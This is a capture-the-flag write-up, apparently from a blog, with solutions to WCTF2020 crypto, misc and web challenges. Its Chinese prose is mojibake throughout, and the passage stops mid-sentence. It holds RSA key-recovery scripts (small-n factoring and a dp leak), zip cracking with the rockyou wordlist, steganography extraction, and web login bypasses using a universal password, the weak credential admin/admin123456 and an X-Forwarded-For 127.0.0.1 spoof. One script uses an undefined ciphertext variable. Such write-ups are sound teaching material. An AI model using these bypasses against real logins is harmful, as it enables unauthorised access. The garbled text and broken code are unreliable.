<code>wctf2020&#123;base64_1s_v3ry_e@sy_and_fuN&#125;</code></p><h2 id="æƒ…ä¹¦-32-solves"><a href="#æƒ…ä¹¦-32-solves" class="headerlink" title="æƒ…ä¹¦ - 32 solves"></a>æƒ…ä¹¦ - 32 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>é¢˜ç›®ï¼š</p><blockquote><p>Premise: Enumerate the alphabet by 0ã€1ã€2ã€â€¦..  ã€25<br>Using the RSA system<br>Encryption:0156 0821 1616 0041 0140 2130 1616 0793<br>Public Key:2537 and 13<br>Private Key:2537 and 937</p><p>flag: wctf2020{Decryption}</p></blockquote><p>å…¶å®è¿™é¢˜ä¸¥æ ¼æ„ä¹‰ä¸Šä¹Ÿä¸æ˜¯æˆ‘å‡ºçš„ï¼Œæ˜¯æœ‹å‹çš„ç”·æœ‹å‹ä¹‹å‰çºªå¿µæ—¥ç»™å¥¹çš„ï¼Œç„¶åæ±‚åŠ©äºæˆ‘æ¥è§£ï¼Œè§‰å¾—æŒºæœ‰æ„æ€çš„å°±ç›´æ¥å«–è¿‡æ¥äº†ã€‚</p><p>å…¶å®è¿™ä¸ªä¹Ÿæœ‰çŒœå¾—å‡ºæ¥çš„å«Œç–‘ï¼Œä¸è¿‡å¾—ææ¸…æ¥šå®ƒçš„æ ¼å¼ï¼Œç®—æ˜¯é CTFer çš„è„‘å›è·¯å§ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br>d = <span class="hljs-number">937</span><br>e = <span class="hljs-number">13</span><br>n = <span class="hljs-number">2537</span><br><br>al = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><br>enc = [<span class="hljs-number">156</span>, <span class="hljs-number">821</span>, <span class="hljs-number">1616</span>, <span class="hljs-number">41</span>, <span class="hljs-number">140</span>, <span class="hljs-number">2130</span>, <span class="hljs-number">1616</span>, <span class="hljs-number">793</span>]<br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> enc:<br>result = <span class="hljs-built_in">pow</span>(i, d, n)<br>flag += al[result%<span class="hljs-number">26</span>]<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># flag = iloveu</span><br></code></pre></td></tr></table></figure><p>å…¶å®æ˜¯æœ‰ç‚¹å‘çš„ã€‚ã€‚ã€‚å¸Œæœ›ä¸è¦æ‰“æˆ‘</p><h2 id="ä½›è¯´ï¼šåªèƒ½å››å¤©-19-solves"><a href="#ä½›è¯´ï¼šåªèƒ½å››å¤©-19-solves" class="headerlink" title="ä½›è¯´ï¼šåªèƒ½å››å¤© - 19 solves"></a>ä½›è¯´ï¼šåªèƒ½å››å¤© - 19 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>æ ‡é¢˜æºäºå¾®åšçš„æ¢—ï¼Œé‡ç‚¹åœ¨ä½›ã€‚</p><p>é¢˜ç›®ï¼š</p><blockquote><p>åœ£ç»åˆ†ä¸ºã€Šæ—§çº¦å…¨ä¹¦ã€‹å’Œã€Šæ–°çº¦å…¨ä¹¦ã€‹</p><p>hint1: è™½ç„¶æœ‰ç‚¹ä¸ç¯ä¿ï¼Œä½†hintå¥½åƒæ˜¯ä¸€æ¬¡æ€§çš„ï¼Œå¾—åˆ°åå°±æ²¡æœ‰åˆ©ç”¨ä»·å€¼äº†ã€‚</p><p>hint2: å‡¯æ’’ä¸æ˜¯æœ€åä¸€æ­¥ï¼Œby the wayï¼Œå‡¯æ’’ä¸ºä»€ä¹ˆå«åšå‡¯æ’’ï¼Ÿ</p></blockquote><p>é¢˜ç›®è¡¨è¿°å¯ä»¥çŸ¥é“æœ‰æ–°çº¦ä¸ä½›è®ºç¦…ï¼Œlinkï¼š<code>http://hi.pcmoe.net/buddha.html</code></p><p>è§£å‡ºæ¥å…¨æ˜¯ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚ï¼Œlinkï¼š<code>http://z.duoluosb.com/</code></p><p>å†è§£å°±æ˜¯ <code>RLJDQTOVPTQ6O6duws5CD6IB5B52CC57okCaUUC3SO4OSOWG3LynarAVGRZSJRAEYEZ_ooe_doyouknowfence</code>ï¼Œåé¢æœ‰æç¤º fenceï¼Œä¹Ÿå°±æ˜¯æ …æ å¯†ç äº†ï¼Œè¿™é‡Œè®¾ç½®æ˜¯æ …æ 4ä½ï¼Œæ ¹æ® hint1 ä¹Ÿå¯ä»¥çŸ¥é“ <code>_doyouknowfence</code> è¿™ä¸€æ®µä¸ç”¨æ”¾è¿›æ …æ ã€‚</p><p>è§£å®Œå°±æ˜¯ <code>R5UALCUVJDCGD63RQISZTBOSO54JVBORP5SAT2OEQCWY6CGEO53Z67L_doyouknowCaesar</code>ï¼Œæç¤ºå‡¯æ’’ï¼Œå‡¯æ’’å¯†ç æœ€å¹¿çš„æ˜¯ç§»ä½3ä½ï¼Œå¾ˆå¤šåœ¨çº¿è§£ç å™¨é»˜è®¤ä¹Ÿæ˜¯3ä½ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯3ä½ç§»ä½ã€‚</p><p>æœ€åå¾—åˆ° <code>O5RXIZRSGAZDA63ONFPWQYLPL54GSYLOM5PXQ2LBNZTV6ZDBL53W67I</code>ï¼Œå…¨æ˜¯å¤§å†™å­—æ¯ï¼Œå®¹æ˜“æƒ³åˆ°(æ‰æ€ª)base32ï¼Œè§£ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚</p><p>flag: <code>wctf2020&#123;ni_hao_xiang_xiang_da_wo&#125;</code></p><p>å‡ºé¢˜äººåˆæ˜¯è—åœ¨åºŠåº•ä¸‹çš„ä¸€å¤©ã€‚ã€‚ã€‚ã€‚ã€‚</p><h2 id="babyrsa-35-solves"><a href="#babyrsa-35-solves" class="headerlink" title="babyrsa - 35 solves"></a>babyrsa - 35 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>åŸºæœ¬åšè¿‡rsaçš„é¢˜ç›®éƒ½æ‡‚ï¼Œä¹Ÿæ˜¯è®©èŒæ–°å­¦çš„ï¼Œé¢˜ç›®ï¼š</p><blockquote><p>c &#x3D; 28767758880940662779934612526152562406674613203406706867456395986985664083182<br>n &#x3D; 73069886771625642807435783661014062604264768481735145873508846925735521695159<br>e &#x3D; 65537</p></blockquote><p>ç»™å‡ºäº†ï¼Œnï¼Œeï¼Œcï¼Œè€Œä¸”nå¾ˆå°ï¼Œæ‹¿å» <a href="http://www.factordb.com/">http://www.factordb.com/</a> è§£ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ° pï¼Œqï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„è§£æ³•äº†ã€‚</p><p>è¿™æ˜¯ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br><br>n = <span class="hljs-number">73069886771625642807435783661014062604264768481735145873508846925735521695159</span><br>e = <span class="hljs-number">65537</span><br>p = <span class="hljs-number">386123125371923651191219869811293586459</span><br>q = <span class="hljs-number">189239861511125143212536989589123569301</span><br><br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br><span class="hljs-comment"># wctf2020&#123;just_@_piece_0f_cak3&#125;</span><br></code></pre></td></tr></table></figure><p>èŒæ–°ä»¬è¦æ˜¯ç¢°åˆ°æ¨¡å—å®‰è£…çš„é—®é¢˜ä¹Ÿå¯ä»¥å»æˆ‘åšå®¢ç¿»ç¿»ï¼Œé—²å¾—æ²¡äº‹å¹²çš„æ—¶å€™æ•´ç†çš„ã€‚</p><h2 id="leak-16-solves"><a href="#leak-16-solves" class="headerlink" title="leak - 16 solves"></a>leak - 16 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>è¿™é¢˜æ˜¯ dp æ³„éœ²ï¼Œé¢˜ç›®ï¼š</p><blockquote><p>e &#x3D; 65537<br>n &#x3D; 156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847<br>c &#x3D; 108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869<br>dp &#x3D; 734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</p></blockquote><p>å…·ä½“åŸç†å¯ä»¥å‚è€ƒä¸€ä¸‹ <a href="https://www.dazhuanlan.com/2019/10/04/5d970ff4a37c5/">RSAå¸¸è§æ”»å‡»æ–¹æ³•</a>ï¼Œ<a href="https://www.jianshu.com/p/74270dc7a14b">RSAä¹‹æ‹’ç»å¥—è·¯</a></p><p>è¿™é‡Œåªç»™ expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">156808343598578774957375696815188980682166740609302831099696492068246337198792510898818496239166339015207305102101431634283168544492984586566799996471150252382144148257236707247267506165670877506370253127695314163987084076462560095456635833650720606337852199362362120808707925913897956527780930423574343287847</span><br>c = <span class="hljs-number">108542078809057774666748066235473292495343753790443966020636060807418393737258696352569345621488958094856305865603100885838672591764072157183336139243588435583104423268921439473113244493821692560960443688048994557463526099985303667243623711454841573922233051289561865599722004107134302070301237345400354257869</span><br>dp = <span class="hljs-number">734763139918837027274765680404546851353356952885439663987181004382601658386317353877499122276686150509151221546249750373865024485652349719427182780275825</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, e):<br><span class="hljs-keyword">if</span> (dp*e-<span class="hljs-number">1</span>) % i == <span class="hljs-number">0</span>:<br>p = (dp*e-<span class="hljs-number">1</span>)//i + <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> n % p == <span class="hljs-number">0</span>:<br>q = n // p<br>d = gmpy2.invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(libnum.n2s(m))<br>exit()<br><span class="hljs-comment"># wctf2020&#123;dp_leaking_1s_very_d@angerous&#125;</span><br></code></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="æ¯”èµ›è§„åˆ™-149-solves"><a href="#æ¯”èµ›è§„åˆ™-149-solves" class="headerlink" title="æ¯”èµ›è§„åˆ™ - 149 solves"></a>æ¯”èµ›è§„åˆ™ - 149 solves</h2><p>çœ‹è§„åˆ™äº¤ flagï¼Œç½‘é¡µç›´æ¥å¤åˆ¶ï¼Œä¸å¤šè¯´ã€‚</p><h2 id="Welcome-51-solves"><a href="#Welcome-51-solves" class="headerlink" title="Welcome - 51 solves"></a>Welcome - 51 solves</h2><p>é¢˜ç›®ï¼š</p><blockquote><p>ã€Šè®ºè¯­ã€‹ï¼šä¸‰äººè¡Œï¼Œå¿…æœ‰æˆ‘å¸ˆç„‰ã€‚</p></blockquote><p>è¿™æ˜¯2019å¹´å›½èµ›çš„ç­¾åˆ°é¢˜ï¼Œæå–å‡ºæ¥æ”¹ä¸ªflagã€‚é¢˜ç›®æç¤ºæ˜¯ä¸‰äººè¡Œï¼Œæ‰€ä»¥ä¸‰ä¸ªäººå¤´å°±èƒ½æ‹¿flagäº†ã€‚å½“ç„¶å‡ºé¢˜äººåœ¨æµ‹è¯•çš„æ—¶æ‰‹æœºæ‰“å¼€ä¸¤ä¸ªäººå¤´ä¸€èµ·æ¥æµ‹è¯•å°±å¯ä»¥ã€‚ã€‚ã€‚å½“ç„¶ï¼Œå…¶å®åªè¦æ˜¯ä¸ªåœ†å½¢å°±èƒ½è¯†åˆ«ã€‚åæ¥åˆå‡ºç°äº†ç©ºæ°”ä¸­çªç„¶å‡ºç°ä¸ªåœ†ï¼Œç»†æ€ææã€‚ã€‚</p><p>çœ‹äº†ä¸€äº›é€‰æ‰‹ wp çš„å„ç§æˆªå›¾ï¼Œæ¯”å¦‚æ‹¿ tfboys çš„ï¼Œä¸€ä¸ªäººå¤´ä¸‰ä¸ªåœˆçš„ã€‚ã€‚ã€‚å‡ºé¢˜äººè¦ç¬‘å²”æ°”äº†å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆ</p><h2 id="Space-Club-57-solves"><a href="#Space-Club-57-solves" class="headerlink" title="Space Club - 57 solves"></a>Space Club - 57 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>è¿™ä¸ªç®—æ˜¯æ¯”è¾ƒå¸¸è§„çš„ misc äº†ï¼Œtxt é‡Œå…¨æ˜¯ç©ºæ ¼ï¼Œä½†æ˜¯é•¿åº¦ä¸ä¸€æ ·ï¼Œctrl + A å°±æ˜¯æƒŠå–œï¼Œé‚£æˆ‘ä»¬çŒœæµ‹ä»£è¡¨ä¸º0ï¼Œ1ã€‚</p><p>æ¥ä¸‹æ¥è„šæœ¬ä¸€è·‘ï¼Œä»€ä¹ˆéƒ½æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env</span><br><span class="hljs-comment">#encoding=utf-8</span><br><span class="hljs-keyword">import</span> libnum<br>binary = []<br>tmp = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;space.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readlines():<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(x.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)) == <span class="hljs-number">6</span>:<br>tmp += <span class="hljs-string">&#x27;0&#x27;</span><br><span class="hljs-keyword">else</span>:<br>tmp += <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(tmp) == <span class="hljs-number">8</span>:<br>binary.append(tmp)<br>tmp = <span class="hljs-string">&#x27;&#x27;</span><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> binary:<br>flag += libnum.b2s(i)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment"># wctf2020&#123;h3re_1s_y0ur_fl@g_s1x_s1x_s1x&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Shop-18-solves"><a href="#Shop-18-solves" class="headerlink" title="Shop - 18 solves"></a>Shop - 18 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p><img src="https://s1.ax1x.com/2020/03/30/GuCnK0.jpg" alt="GuCnK0.jpg"></p><p>è¿™é¢˜å…¶å®æ˜¯ picoCTF 2019 é­”æ”¹è¿‡æ¥çš„é¢˜ï¼Œè€ƒå¯Ÿç‚¹æ˜¯<strong>æ•´æ•°æº¢å‡º</strong>ï¼Œæœ¬æ¥æƒ³ç€æ”¾ä¸ª hint è¯´ä¸€è¯´æ˜¯32ä½è¿˜æ˜¯64ï¼Œä½†æ˜¯å¤§å®¶éƒ½å¾ˆå¼ºã€‚ã€‚ã€‚å…¨éƒ½ç§’äº†ï¼Œä¸è¿‡éšä¾¿è¾“å…¥123456789ä¹Ÿå®Œäº‹äº†ï¼Œè¿™é‡Œæ˜¯ int 32ã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCevq.jpg" alt="GuCevq.jpg"></p><p>å 4ä¸ªå­—èŠ‚  -2147483648 ~ 2147483647ã€‚</p><p>æœ‰é’±å°±ä¹°ä¹°ä¹°ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/30/GuCZ2n.jpg" alt="GuCZ2n.jpg"></p><h2 id="find-me-30-solves"><a href="#find-me-30-solves" class="headerlink" title="find me - 30 solves"></a>find me - 30 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>è¿™é¢˜æ˜¯æˆ‘æœ€åˆæ‰“CTFæ—¶åœ¨å±æ€§é‡Œæ‰¾åˆ°flagï¼Œæœ¬æ¥æƒ³ç”¨æ¥åšç­¾åˆ°çš„(æ€ä¹ˆå…¨éƒ¨æ˜¯ç­¾åˆ°)ï¼Œä½†æ˜¯çœ‹å¤§å®¶åšå¾—å¥½çŒ›ï¼Œå°±éšä¾¿æ‰¾äº†ä¸ªç›²æ–‡åœ¨çº¿ç½‘ç«™ä¸¢è¿›å»äº†ã€‚ã€‚ã€‚</p><p>è§£é¢˜æ€è·¯ï¼šå³é”® -&gt; å±æ€§ -&gt; è¯¦ç»†ä¿¡æ¯ï¼ŒæŠŠç›²æ–‡å¤åˆ¶ï¼Œåœ¨çº¿å·¥å…·è·‘ï¼Œå¾—flagã€‚</p><p>å‚è€ƒå·¥å…·ï¼š<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">link</a></p><h2 id="girlfriend-24-solves"><a href="#girlfriend-24-solves" class="headerlink" title="girlfriend - 24 solves"></a>girlfriend - 24 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>è¿™é¢˜åŸæœ¬æˆ‘æ˜¯æƒ³ç”¨æ‹¨å·é”®å¼¹å¥åƒé‡Œä¹‹å¤–ï¼Œè®©å¤§å®¶æŠŠæ•°å­—å¼„å‡ºæ¥base64ä¸€ä¸‹ï¼Œä½†å¥½åƒéå¸¸æ†¨ï¼Œä¸ºäº†ä¸è¢«æ‰“ï¼Œæ”¹æˆäº†ä¹é”®é”®ç›˜ã€‚å¾ˆå¤šå¸ˆå‚…ä¸€å¼€å§‹è”æƒ³åˆ°äº† Morseï¼Œå¥½åƒä¹Ÿæœ‰ç‚¹é“ç†ã€‚ã€‚ã€‚</p><p>æˆ‘æƒ³èµ·æ¥ä»¥å‰åˆšå¼€å§‹æ‰“CTFçš„æ—¶å€™ï¼Œè·Ÿå­¦é•¿æ‰“ä¿„ç½—æ–¯çš„æ¯”èµ›ï¼Œæˆ‘ç¡¬æ˜¯å¬äº†ä¸€æ™šä¸Šæ²¡å¬å‡ºæ¥ï¼ŒåçŸ¥åè§‰æ‰å‘ç°æœ‰ <code>dtmf-decoder</code>è¿™ç§ä¸œè¥¿ã€‚</p><p>è¿™é‡Œè·‘ä¸€éå°±å¯ä»¥å¾—åˆ°</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">999</span>*<span class="hljs-number">666</span>*<span class="hljs-number">88</span>*<span class="hljs-number">2</span>*<span class="hljs-number">777</span>*<span class="hljs-number">33</span>*<span class="hljs-number">6</span>*<span class="hljs-number">999</span>*<span class="hljs-number">4</span>*<span class="hljs-number">444</span>*<span class="hljs-number">777</span>*<span class="hljs-number">555</span>*<span class="hljs-number">333</span>*<span class="hljs-number">777</span>*<span class="hljs-number">444</span>*<span class="hljs-number">33</span>*<span class="hljs-number">66</span>*<span class="hljs-number">3</span>*<span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>æŒ‰çš„æ—¶å€™ç”¨ * åˆ†éš”äº†ä¸€ä¸‹ï¼Œå¯¹ç€é”®ç›˜çœ‹ä¸€ä¸‹å°±å®Œäº‹äº†ã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/GnaR76.png" alt="GnaR76.png"></p><p>å‚è€ƒå·¥å…·åœ¨ Gayhub ä¸Šæœ dtmf ç¬¬ä¸€ä¸ªå°±æ˜¯ï¼Œç¯å¢ƒæ˜¯ Python2</p><p>å†™è„šæœ¬æŠŠæ•°å­—æ›¿æ¢æˆå­—æ¯ä¹Ÿå¾ˆæ–¹ä¾¿ï¼Œè¿™é‡Œä¸å†™äº†ã€‚ï¼ˆæ‡’</p><h2 id="Alison-likes-jojo-13-solves"><a href="#Alison-likes-jojo-13-solves" class="headerlink" title="Alison likes jojo - 13 solves"></a>Alison likes jojo - 13 solves</h2><blockquote><p>Author: Alison</p></blockquote><p>Alison å¤§è…¿å­å‹æƒ…å‡ºçš„é¢˜ç›®ï¼Œè¿˜æ˜¯å»å¹´ç»™æˆ‘çš„ï¼Œè¿é¥­éƒ½æ²¡åƒï¼Œæˆ‘å¯æ„ŸåŠ¨äº†ã€‚</p><p>æ‰“å¼€å‹ç¼©åŒ…æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤å¼ å›¾ç‰‡ï¼Œå…ˆ binwalk ä¸€ä¸‹ç¬¬ä¸€å¼ å›¾ç‰‡</p><p><img src="https://s1.ax1x.com/2020/03/30/GndPun.jpg" alt="GndPun.jpg"></p><p>æœ‰ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè¿™é‡Œæˆ‘ç”¨ foremost åˆ†ç¦»</p><p><img src="https://s1.ax1x.com/2020/03/30/GnddKA.jpg" alt="GnddKA.jpg"></p><p>è¿›å»å‘ç°å‹ç¼©åŒ…ï¼Œè§£å‹è¦å¯†ç ï¼Œç”¨ fcrackzip è·‘ä¸€ä¸‹kaliè‡ªå¸¦çš„rockyouå­—å…¸ï¼Œå‡ ç§’å°±å‡ºæ¥äº†</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnd9js.jpg" alt="Gnd9js.jpg"></p><p>è§£å‹ä¹‹åå‘ç°æœ‰ä¸ªtxtï¼Œbase64å‡ ä¸‹å°±å¯ä»¥å¾—åˆ° <code>killerqueen</code>ï¼Œä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œä½†ç»™å‡ºæ¥ä¸€å®šæœ‰ç”¨ï¼Œå¦ä¸€ä¸ªå›¾ç‰‡æ˜¯ jpgï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•ä¸ jpg æœ‰å…³çš„éšå†™å·¥å…·ï¼Œè¿™é‡Œæ˜¯ <code>outguess</code>ã€‚ä¹‹å‰å¾—åˆ°çš„å°±æ˜¯keyï¼Œæå–å‡ºæ¥å°±æ˜¯flagã€‚</p><p><img src="https://s1.ax1x.com/2020/03/30/Gndpcj.jpg" alt="Gndpcj.jpg"></p><h2 id="çˆ¬-31-solves"><a href="#çˆ¬-31-solves" class="headerlink" title="çˆ¬ - 31 solves"></a>çˆ¬ - 31 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>åˆæ˜¯ä¸€ä¸ªé€åˆ†é¢˜ï¼Œæˆ‘docæŠŠflagæ”¾è¿›å›¾ç‰‡çš„åº•éƒ¨ç„¶åè½¬æˆpdfã€‚é¢„æœŸè§£æ˜¯ç”¨Photoshopæ‰“å¼€å¯ä»¥çœ‹åˆ°å¦ä¸€å¼ å›¾ï¼Œä¸è¿‡wpsæˆ–è€…å…¶å®ƒå¯ä»¥ç¼–è¾‘pdfçš„è½¯ä»¶æ‰“å¼€ç›´æ¥æŠŠå›¾ç‰‡ç§»å¼€ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ã€‚ã€‚è¿™é‡Œå°±ä¸å¤šè¯´äº†ã€‚</p><h2 id="è°ƒæŸ¥é—®å·-58-solves"><a href="#è°ƒæŸ¥é—®å·-58-solves" class="headerlink" title="è°ƒæŸ¥é—®å· - 58 solves"></a>è°ƒæŸ¥é—®å· - 58 solves</h2><p>å¡«é—®å·å¾—åˆ†ï¼ŒGoogleçš„é—®å·éœ€è¦ç§‘å­¦ä¸Šç½‘ä¸€ä¸‹ã€‚</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="checkin-90-solves"><a href="#checkin-90-solves" class="headerlink" title="checkin - 90 solves"></a>checkin - 90 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>æ‰“å¼€ç•Œé¢é—®ä½œè€…ï¼Œä½œè€…åœ¨é¢˜ç›®éƒ½ä¼šè¯´æ˜ï¼Œè¾“å…¥æ é™åˆ¶äº†æœ€é•¿3ä¸ªï¼ŒæŒ‰é’®åˆä¸è®©ä½ æŒ‰ï¼Œäºæ˜¯æ”¹å‰ç«¯ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWzX6.png" alt="GnWzX6.png"></p><p>ç„¶åå¼¹å‡ºä¸€ä¸ªæ¡†æ¡†ï¼Œæç¤ºä¸ºè¿œå¤çš„åšå®¢ï¼ˆåšå®¢æ‰˜ç®¡åœ¨ GitHubï¼Œåˆšå¥½Githubæ¯”èµ›å‰ä¸€å¤©åˆå‡ºäº‹äº†ï¼Œä¸€åº¦ç„¦è™‘ï¼‰</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWx6x.png" alt="GnWx6x.png"></p><p>è¿›å»çœ‹çœ‹ï¼Œåœ¨ä¸»é¡µå°±æœ‰ä¸€åŠçš„ flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnf90O.png" alt="Gnf90O.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªå°å¿ƒæœºï¼Œç¬¬ä¸€æ¬¡çœ‹çš„æ—¶å€™è‚¯å®šä»¥ä¸ºæ²¡æœ‰æ”¾å…¨ï¼Œç­‰ååº”è¿‡æ¥çš„æ—¶å€™å¼€å§‹å›åˆ äº†ï¼Œæ‰€ä»¥å¾—å®¡å‰ç«¯æˆ–è€…å†ç­‰ä¸€éï¼ˆé€ƒ</p><p>ç„¶åè¿œå¤çš„åšå®¢ï¼Œçµæ„Ÿæ¥è‡ªäº ctfhub çš„å½©è›‹é¢˜ï¼Œæ–‡ç« æ˜¯æŒ‰æ—¶é—´æ’åºçš„ï¼Œé‚£ä¹ˆç¿»åˆ°æœ€åä¸€é¡µå‘ç°æœ‰ä¸ª 1970 å¹´çš„åšå®¢ï¼Œæ–‡ç« åº•éƒ¨å°±æœ‰å¦ä¸€åŠçš„ flagï¼Œè¿™ä¸ªå°±æ˜¯ç­¾åˆ°é¢˜ï¼Œæˆ‘æƒ³äº†æœ€ä¹…çš„ä¸€é“é¢˜ã€‚</p><p>psï¼šé‚£ç¯‡æ–‡ç« å¾ˆæœ‰æ„ä¹‰ï¼Œå¯ä»¥çœ‹çœ‹ï¼Œå˜»å˜»ã€‚</p><h2 id="admin-70-solves"><a href="#admin-70-solves" class="headerlink" title="admin - 70 solves"></a>admin - 70 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p><strong>login as admin</strong></p><p>è¿™é¢˜ä¸€å¼€å§‹ä¸‡èƒ½å¯†ç å°±èƒ½æ‹¿flagï¼Œåæ¥è§‰å¾—å¤ªç®€å•äº†ï¼ŒåŠ ç‚¹åŸºç¡€å†…å®¹ï¼Œç™»å½•æ¡†é¦–å…ˆä¸‡èƒ½å¯†ç å°±èƒ½ç»•è¿‡ï¼Œå½“ç„¶å¼±å£ä»¤ä¹Ÿå¯ä»¥ï¼Œadmin&#x2F;admin123456ï¼Œä¸è¿‡ä¸å»ºè®®çˆ†ç ´ã€‚ã€‚ã€‚å¥½å‡ æ¬¡éƒ½æ‰“downäº†ã€‚</p><p><strong>æœ¬åœ°ip</strong></p><p>åŠ  xff å¤´éƒ¨å°±å¯ä»¥ç»•è¿‡äº†ï¼š<code>X-Forwarded-For:127.0.0.1</code>ï¼Œç”¨ä¸€äº›æµè§ˆå™¨æ’ä»¶å°±å¯ä»¥è§£å†³äº†ï¼ŒHackbar ä¹Ÿå¯ä»¥ add header</p><p>æ¥ä¸‹æ¥ GET ä¼ å‚ <code>ais=520</code> å’Œ POST ä¼ å‚ <code>wust=1314</code> å°±å¯ä»¥äº†ï¼Œæœ€åæ‹¿åˆ°ä¸€ä¸ªè¢«åˆ†è§£çš„ urlï¼Œæ˜¯ paste.ubuntu 